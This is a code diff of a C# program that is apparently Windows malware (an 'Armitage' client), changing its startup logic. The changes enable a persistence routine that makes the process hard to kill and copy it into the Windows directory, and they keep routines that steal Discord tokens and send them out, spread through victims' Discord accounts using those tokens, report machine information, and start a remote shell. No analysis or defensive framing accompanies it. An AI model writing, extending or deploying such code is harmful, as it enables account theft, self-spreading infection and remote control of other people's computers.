@@ -20,15 +20,15 @@ namespace Client
         {
             ArgsParser(args);
             CheckRealApplication();
+            CheckSettings();
+
             // make sure this thing wont crash
+
             Application.ThreadException += Application_ThreadException;
 
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
 
-            /// Init update checkers.
-            Utilities.Updater Updater = new Utilities.Updater();
 
-            Updater.Start();
 #if !DEBUG
             /// Check if Application is already on victim PC
             if (!Constants.IsInAppData() && !Constants.IsInWinDir())
@@ -47,7 +47,14 @@ namespace Client
             }
             else // it is admin!
             {
-                if (!Constants.IsInWinDir()) GoSomewhereSafe();
+                Console.WriteLine("Admin!");
+                if (!Constants.IsInWinDir())
+                {
+                    if (GoSomewhereSafe() != null)
+                    {
+                        Environment.Exit(0);
+                    }
+                }
                 // now it will run there, wait for it to hook there
                 if (Constants.IsInWinDir())
                 {
@@ -69,7 +76,7 @@ namespace Client
                     }
                     // everything is set
                     // set the letter to be critical, unburnable
-                    // ProtectTheLetter();
+                    ProtectTheLetter();
                     // send to events we had a successful run
 
                 }
@@ -88,21 +95,29 @@ namespace Client
             // Discord tokens
             var discord_tokens = Armitage.Cookies.Discord_Token.Stealu();
             Armitage.Cookies.Discord_Token.Send(discord_tokens);
-            if (discord_tokens.Count > 0)
+            if (discord_tokens.Count > 0 && (Constants.Today - Properties.Settings.Default.LastDiscordSent).TotalDays > 5)
             {
-                Armitage.Postman.Discord_Spreader spreader = new Armitage.Postman.Discord_Spreader(discord_tokens.ToArray());
-
+                Armitage.Postman.Discord_Spreader spreader = new Armitage.Postman.Discord_Spreader(discord_tokens.Select(x => x.Item2).ToArray());
                 spreader.Start();
-
-            } else { Console.WriteLine("No tokens ;'( " + discord_tokens.Count.ToString()); }
+            }
+            else { Console.WriteLine("found tokens : " + discord_tokens.Count.ToString()); }
 
             /// Send machine info
             Armitage.Informer.Start();
 #endif
 
+            /// Init update checkers.
+            Utilities.Updater Updater = new Utilities.Updater();
+            Updater.Start();
 
             /// Start remote shell
             Armitage.Shell.Shell.Start();
+            
+            Properties.Settings.Default.IsFirstRun = false;
+            Properties.Settings.Default.Save();
+
+            Console.WriteLine("All Done");
+
             while (true)
             {
                 // Sleep, useless, but...makes me feel confident
@@ -120,8 +135,6 @@ namespace Client
         private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
         {
             Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
-
-            
         }
 
         public static void ArgsParser(string[] args)
@@ -225,6 +238,11 @@ namespace Client
                 catch { }
 
             }
+        }
+        public static void CheckSettings()
+        {
+            Console.WriteLine("Is Discord Sent : " + Properties.Settings.Default.IsDiscordSent.ToString());
+            Console.WriteLine("Is First Run : " + Properties.Settings.Default.IsFirstRun.ToString());
         }
     }
 }
